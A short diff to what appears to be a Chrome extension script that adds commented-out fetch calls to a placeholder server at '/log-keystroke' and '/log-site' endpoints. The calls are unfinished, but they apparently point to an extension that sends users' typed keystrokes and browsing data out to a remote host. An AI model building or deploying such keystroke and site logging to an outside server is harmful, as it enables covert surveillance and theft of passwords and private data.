@@ -19,3 +19,7 @@ chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
     });
   }
 });
+
+/*fetch('http://YOUR_SERVER_IP_OR_DOMAIN:3000/log-keystroke', 
+  fetch('http://YOUR_SERVER_IP_OR_DOMAIN:3000/log-site',  => Update this URL to work beyond localhost 
+*/
